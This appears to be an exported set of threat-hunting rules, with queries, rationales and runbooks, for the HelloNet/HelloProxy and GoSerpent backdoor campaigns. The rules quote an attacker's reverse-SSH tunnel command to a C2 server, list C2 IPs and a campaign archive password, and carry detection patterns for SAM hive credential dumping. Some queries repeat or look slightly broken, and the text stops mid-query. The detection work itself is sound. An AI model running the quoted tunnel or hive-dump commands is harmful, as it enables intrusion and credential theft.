HelloProxy AFD interception artifact: tesh4RPC.txt log written to C:\Users\Public AICommand & Control High
Hunts the operational log file HelloProxy writes for every connection its AFD_RECV hook processes (C:\users\public\tesh4RPC.txt, 'threadid: <tid> pid=<pid>'). The filename is unique to this implant, making the file-write a very high-fidelity indicator of an active in-memory proxy. Rationale: tesh4RPC.txt in C:\users\public is a verbatim, implant-unique artifact from the article (HelloProxy's AFD_RECV handler log). No legitimate software writes this name, so a single hit is high-confidence C2 activity. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst copying the IOC file into Public during reproduction
  • Threat-intel sync tool staging IOC samples in a shared folder
  • Backup restore of a previously infected profile
Response runbook
1) Triage: identify the writing process (InitiatingProcessFileName) — it should resolve to an injected svchost.exe; read the file to confirm the 'threadid: <tid> pid=<pid>' format. 2) Contain: isolate host, capture a full memory image of the svchost PID before killing it (payload is in-memory only), then quarantine. 3) Hunt: check listeners on ports 5003/5060, outbound to 5.39.253.206 / 176.32.34.135, and frontpage.exe SSH tunnels.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "tesh4RPC.txt"
| where FolderPath has @"\Users\Public"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessFolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "tesh4RPC.txt"
| where TargetFilePath has @"\Users\Public"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActorUsername
| order by TimeGenerated desc

HelloNet C2 egress to 5.39.253.206 / 176.32.34.135 AICommand & Control Medium
Detects any host communicating with the two HelloNet command-server IPs, including the SSH tunnel endpoint 5.39.253.206:3522 used to relay proxied traffic back to the attackers. Straight IOC-match network detection across endpoint and NDR telemetry. Rationale: Both IPs (5.39.253.206, 176.32.34.135) are pre-extracted IOCs corroborated by the Securelist report and independent write-ups as HelloNet C2; 5.39.253.206:3522 is the confirmed SSH tunnel endpoint. Direct IOC match = high confidence. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://www.kaspersky.ru/about/press-releases/novyj-bekdor-atakoval-desyatki-rossijskih-organizacij
ATT&CKT1571 T1090
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel/sandbox infrastructure deliberately connecting to the IOC IPs for research
  • Shared hosting reuse — if the VPS is later re-leased to a benign tenant (validate timestamp against campaign window May-Jul 2026)
  • Security scanner probing the IPs from a jump host
Response runbook
1) Triage: identify the initiating process — svchost.exe (injected) or frontpage.exe (renamed PuTTY) confirms HelloNet; a browser suggests unrelated/scanner traffic. 2) Contain: block both IPs at the perimeter, isolate the host, kill the tunnel process. 3) Hunt: pivot on the host for wtsapi32.dll sideload, tesh4RPC.txt, and listeners on 5003/5060; sweep proxy logs for other internal hosts talking to these IPs.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in ("5.39.253.206", "176.32.34.135")
| project Timestamp, DeviceName, RemoteIP, RemotePort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessAccountName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr in ("5.39.253.206", "176.32.34.135")
| project TimeGenerated, SrcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, NetworkProtocol, DvcAction
| order by TimeGenerated desc

Renamed PuTTY reverse SSH tunnel to HelloNet C2 (frontpage.exe -R sftp@5.39.253.206) AICommand & Control High
Detects the HelloNet reverse-tunnel launch: a renamed PuTTY (frontpage.exe in C:\users\public\music) opening an SSH reverse tunnel (-R 8443:...:5003) to sftp@5.39.253.206 on port 3522. Anchored on the C2 user@host string and the -R reverse-forward flag so it catches the behaviour even if the binary is renamed again. Rationale: Verbatim from the article: 'C:\users\public\music\frontpage.exe -C -N -R 8443:[redacted]:5003 sftp@5.39.253.206 -P 3522'. The user@C2 string plus the -R reverse-forward flag is behaviourally unique; the frontpage.exe-in-Public\Music clause catches the masqueraded binary independently. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://cyberpress.org/new-malware-masquerades-as-networking-software-updates/
ATT&CKT1572 T1090 T1036.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A sysadmin legitimately named their own PuTTY 'frontpage.exe' (rare; validate the destination is not 5.39.253.206)
  • IT staff running authorised reverse tunnels to a jump host (destination will differ from the C2)
  • Analyst reproducing the command line in a lab
Response runbook
1) Triage: confirm destination = 5.39.253.206:3522 and forwarded local port 5003 (ties to HelloProxy listener). Recover the -pw argument for the attacker credential. 2) Contain: kill the process, block 5.39.253.206, isolate host, and rotate any exposed jump-host/service creds. 3) Hunt: enumerate all C:\Users\Public\Music binaries estate-wide and correlate with wtsapi32.dll sideload hosts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (ProcessCommandLine has "sftp@5.39.253.206" and ProcessCommandLine has "-R ")
   or (FolderPath has @"\Users\Public\Music" and FileName =~ "frontpage.exe")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where (CommandLine has "sftp@5.39.253.206" and CommandLine has "-R ") or (NewProcessName endswith @"\Users\Public\Music\frontpage.exe")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Injected svchost (netsvcs) listener on HelloProxy ports 5003/5060 AICommand & Control Medium
Detects the HelloProxy control channel: an svchost.exe process opening listening sockets on TCP 5003 and 5060 to await C2 commands after the 0x0502/ASDFASFSAFASDF handshake. A netsvcs svchost creating inbound listeners on these ports is not normal Windows service behaviour. Rationale: Ports 5003 and 5060, initiated by svchost, are the exact HelloProxy listen ports named in the article. svchost.exe (netsvcs) legitimately listens on RPC/known service ports, never on 5003/5060, so this is a clean anomaly. Kept Defender-only: ListeningConnectionCreated has no equivalent in the listed CIM, ASIM, FDR, or Sysmon event schemas. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1571
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate third-party service hosted under svchost that happens to bind 5060 (SIP) — validate the parent is services.exe and check for the co-occurring wtsapi32.dll sideload
  • Enterprise SIP/VoIP softphone service registered as an svchost-hosted service
  • Port-reuse after a benign service released 5003
Response runbook
1) Triage: confirm the svchost PID matches an injected process (cross-ref rule #2 image-load and tesh4RPC.txt writer). 2) Contain: capture memory of the svchost PID, then isolate and kill; block the ports at host firewall. 3) Hunt: look for inbound sessions to 5003/5060 and the outbound tunnel forwarding local:5003 to 5.39.253.206.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project Timestamp, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceNetworkEvents
| where TimeGenerated > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project TimeGenerated, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by TimeGenerated desc
HelloExecutor recon: injected svchost enumerating ViPNet/InfoTeCS export directories AIActions on Objectives High
Detects HelloExecutor reconnaissance where the injected svchost.exe (netsvcs) shells out to enumerate InfoTeCS/ViPNet Administrator key-container Export directories (kc\Export). svchost spawning shell commands that reference infotecs+ViPNet is highly abnormal and specific to this campaign's key-material hunting. Rationale: The article lists explicit recon commands enumerating 'C:\Program Files (x86)\infotecs\ViPNet Administrator', 'ViPNet Client\Export', and 'ViPNet Administrator\kc\Export' — the attackers are hunting ViPNet key material. Requiring an svchost(netsvcs) parent plus infotecs+ViPNet in the child command line makes this campaign-specific rather than a generic 'dir' hunt. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1083 T1057 T1552.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A ViPNet administrator legitimately scripting an inventory of Export directories (parent will be cmd/powershell/explorer, not svchost)
  • Backup software indexing InfoTeCS folders (not spawned by svchost netsvcs)
  • Endpoint asset-management agent scanning Program Files
Suppression filter
| where InitiatingProcessParentFileName =~ "services.exe"
Response runbook
1) Triage: confirm the parent svchost is the injected instance (cross-ref wtsapi32.dll sideload / tesh4RPC.txt on the same host); the netsvcs svchost should never spawn cmd/net/dir. 2) Contain: isolate host, capture svchost memory, and treat any ViPNet key material in kc\Export as compromised — flag for certificate/key reissue. 3) Hunt: pull the full recon command set (query user, ipconfig /all, net user /do, net group /do) from the same PID and check for HelloCleaner log-wiping and outbound to 5.39.253.206.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "svchost.exe" and InitiatingProcessCommandLine has "netsvcs"
| where ProcessCommandLine has "infotecs" and ProcessCommandLine has "ViPNet"
| where ProcessCommandLine has_any ("ViPNet Administrator", "kc\\Export", "ViPNet Client\\Export")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessId
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName endswith @"\svchost.exe"
| where CommandLine has "infotecs" and CommandLine has "ViPNet"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest

| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or SHA1 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or MD5 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or SHA1 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or MD5 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Article-specific behavioural hunt — GoSerpent: a persistent threat evolves with sophisticated data collection and ex
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] GoSerpent/McMx masquerading proxy binaries lass.exe and updates.exe · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] GoSerpent ThumbcacheService staging DB (thumbcache_605a.db) written to C:\Users\Public · [LLM] GoSerpent 7-Zip archiving with hardcoded campaign password @vx0a9n5W2M0c3D6.# · [LLM] GoSerpent QuarksDumpLocalHash / SAM hive local hash extraction · LSASS process access / dump (credential theft)
GoSerpent ThumbcacheService staging DB (thumbcache_605a.db) written to C:\Users\Public AIActions on Objectives High
Hunts creation of the ThumbcacheService collection database thumbcache_605a.db in C:\Users\Public\, where GoSerpent stages harvested .doc/.docx/.pdf/.xls/.xlsx documents before exfiltration. Legitimate Windows thumbnail caches use the same thumbcache_*.db naming but live under AppData\Local\Microsoft\Windows\Explorer, never in the Public profile, making the Public-path variant article-specific. Rationale: Anchored on the article's verbatim filename thumbcache_605a.db (code block) and the C:\Users\Public\ staging path; legitimate thumbcache DBs never live in the Public profile, so the path variant catches renamed samples with near-zero FP. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1074.001 T1119
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A user or admin manually copying their AppData thumbnail cache into C:\Users\Public for troubleshooting
  • Backup/migration tooling that mirrors user profile Explorer caches into a shared Public folder
  • Forensic/IR tools exporting thumbcache artifacts to C:\Users\Public for analysis
  • A security researcher detonating the sample in a lab on a monitored host
Suppression filter
| where InitiatingProcessFolderPath !has @"\Windows\explorer.exe"
Response runbook
1) Triage: identify InitiatingProcessFileName that wrote the DB; a service DLL host (svchost.exe hosting an unknown service) or a binary in Public/Temp is high-suspicion. Inspect the file for a 7-Zip archive nearby and confirm it is not a genuine Explorer cache. 2) Contain: isolate the host, capture the DB and any adjacent .7z archives for analysis, and disable/stop the suspicious Windows service backing ThumbcacheService. 3) Hunt: pivot on the same host for 7-Zip archiving with the campaign password, lass.exe/updates.exe processes, and SAM/LSASS credential-dumping activity in the prior days.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "thumbcache_605a.db"
    or (FolderPath has @"\Users\Public\" and FileName startswith "thumbcache_" and FileName endswith ".db")
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "thumbcache_605a.db"
    or (TargetFilePath has @"\Users\Public\" and TargetFileName startswith "thumbcache_" and TargetFileName endswith ".db")
| project TimeGenerated, DvcHostname, TargetFileName, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

GoSerpent 7-Zip archiving with hardcoded campaign password @vx0a9n5W2M0c3D6.# AIActions on Objectives High
Hunts ThumbcacheService's 7-Zip archiving stage, which packs collected documents into password-protected archives using the fixed password @vx0a9n5W2M0c3D6.# with a 20MB volume limit. The password string is a unique campaign artifact, so any command line containing it is effectively a signature regardless of the archiver binary name. Rationale: The password @vx0a9n5W2M0c3D6.# is a verbatim campaign string with effectively zero legitimate use; matching its alphanumeric core (vx0a9n5W2M0c3D6) survives quoting/escaping and catches renamed 7z binaries. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1560.001 T1074.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst re-running the sample's archive command during malware analysis on a lab host
  • Threat-intel/IR playbook that references the password string in a script comment for testing detections
  • Purple-team exercise emulating GoSerpent's archiving stage
Response runbook
1) Triage: confirm the archiver binary (7z.exe/7za.exe or a renamed copy) and the target file set; look for the -v20m volume flag and the source documents being packed. 2) Contain: isolate the host, preserve the produced archives, and block outbound to any network share the archives were destined for. 3) Hunt: locate thumbcache_605a.db on the same host, review the credential-dumping activity that supplied the share credentials, and check network-share write events for exfiltration of the archives.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "vx0a9n5W2M0c3D6"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where CommandLine has "vx0a9n5W2M0c3D6"
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

GoSerpent/McMx masquerading proxy binaries lass.exe and updates.exe AIInstallation High
Hunts execution of GoSerpent's masquerading binaries lass.exe (mimicking lsass.exe) and updates.exe, which host the SOCKS5 proxy/RAT. lass.exe is never a legitimate Windows binary, and updates.exe running from user-writable/staging directories is a strong anomaly for this campaign. Rationale: lass.exe and updates.exe are named verbatim in the article (code blocks) as GoSerpent's process-masquerading filenames; lass.exe has no legitimate counterpart and the path constraint on updates.exe filters the common legitimate updater binaries. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1036.005 T1090.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate third-party application shipping its own updates.exe from ProgramData/AppData (e.g. some auto-updaters)
  • Developer/test binary coincidentally named lass.exe in a source tree
  • Software packaging or installer temp extraction dropping an updates.exe into a Temp directory
  • Portable app launched from a USB/Public share named updates.exe
Suppression filter
| where not (FileName =~ "updates.exe" and InitiatingProcessFileName in~ ("msiexec.exe","setup.exe"))
Response runbook
1) Triage: pull the SHA256 and signer of the process; unsigned lass.exe or a Go-compiled updates.exe from a user-writable path is high-confidence. Check for a listening socket / SOCKS5 behavior and outbound C2 from the same PID. 2) Contain: isolate the host, kill the process, and block the associated C2 IPs at the perimeter. 3) Hunt: search for ThumbcacheService staging (thumbcache_605a.db), the 7-Zip archive password, and credential-dumping tools deployed by the same backdoor across the environment.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where AccountName !endswith "$"
| where FileName =~ "lass.exe"
    or (FileName =~ "updates.exe" and FolderPath has_any (@"\Users\Public\", @"\Temp\", @"\ProgramData\", @"\AppData\"))
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName endswith @"\lass.exe" or TargetProcessName =~ "lass.exe"
    or ((TargetProcessName endswith @"\updates.exe" or TargetProcessName =~ "updates.exe") and TargetProcessName has_any (@"\Users\Public\", @"\Temp\", @"\ProgramData\", @"\AppData\"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ParentProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

GoSerpent QuarksDumpLocalHash / SAM hive local hash extraction AIActions on Objectives Medium
Hunts the QuarksDumpLocalHash tool GoSerpent deploys to extract local account password hashes from the SAM registry hive for offline cracking, plus the equivalent reg.exe SAM/SECURITY hive save. This is distinct from LSASS memory access and targets the on-disk SAM credential store. Rationale: Anchored on the named tool QuarksDumpLocalHash and its documented SAM-hive extraction behavior; the reg.exe hive-save branch catches the same TTP if the operator uses a LOLBin instead of the custom tool, and it deliberately avoids overlapping the existing LSASS-access detection. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1003.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Sysadmin exporting a SAM/SECURITY hive for legitimate password-audit or migration tooling
  • Endpoint hardening/audit software (e.g. compliance scanners) reading local hive backups
  • IR/forensics collection scripts that reg save HKLM\SAM for evidence
  • Backup software snapshotting registry hives
Suppression filter
| where InitiatingProcessFileName !in~ ("forensic_collector.exe","psexec.exe") and not (InitiatingProcessFileName =~ "cmd.exe" and InitiatingProcessCommandLine has "backup")
Response runbook
1) Triage: confirm the parent process and account; a hive save or quarks* binary spawned by an unknown Go backdoor (lass.exe/updates.exe) rather than an admin session is high-confidence. Check whether the resulting hive/hash output was written to a staging path. 2) Contain: isolate the host, force-reset local account passwords (and any domain accounts used interactively), and revoke cached credentials. 3) Hunt: correlate with ThumbcacheService staging and network-share writes — the dumped credentials are used to authenticate to shares for exfiltration; review share-access logs for the affected accounts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where AccountName !endswith "$"
| where FileName has "quarks" or ProcessCommandLine has "QuarksDumpLocalHash"
    or (FileName =~ "reg.exe" and ProcessCommandLine has "save" and ProcessCommandLine has_any (@"hklm\sam", @"hklm\security"))
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName has "quarks" or CommandLine has "QuarksDumpLocalHash"
    or (NewProcessName endswith @"\reg.exe" and CommandLine has "save" and (CommandLine has @"hklm\sam" or CommandLine has @"hklm\security"))
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: GoSerpent QuarksDumpLocalHash SAM Hive Dump
id: d70e2b19-3c84-4a56-b0f1-9a2c4e7d6b12
description: Detects QuarksDumpLocalHash or reg.exe saving the SAM/SECURITY hive to extract local password hashes, as deployed by the GoSerpent backdoor.
references:

author: SOC Detection Engineering
date: 2026/07/16
tags:

  - attack.t1003.002
logsource:
  category: process_creation
  product: windows
detection:
  selection_tool:
    CommandLine|contains: 'QuarksDumpLocalHash'
  selection_toolname:
    Image|contains: 'quarks'
  selection_regsave:
    Image|endswith: '\reg.exe'
    CommandLine|contains: 'save'
    CommandLine|contains:
      - 'hklm\sam'
      - 'hklm\security'
  condition: selection_tool or selection_toolname or selection_regsave
level: high
source:windows.sysmon @EventID:1 (@Image:(*\QuarksDumpLocalHash.exe OR *\quarksdumplocalhash.exe) OR @CommandLine:(*QuarksDumpLocalHash* OR *quarksdumplocalhash*) OR (@Image:(*\reg.exe OR *\REG.EXE) AND @CommandLine:(*save* OR *SAVE*) AND @CommandLine:(*HKLM\SAM* OR *hklm\sam* OR *HKLM\SECURITY* OR *hklm\security*)))
#event_simpleName=ProcessRollup2
| ImageFileName=/quarks/i OR CommandLine=/QuarksDumpLocalHash/i OR (ImageFileName=/\\reg\.exe$/i AND CommandLine=/save/i AND CommandLine=/hklm\\(sam|security)/i)
| groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentBaseFileName], function=count())

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
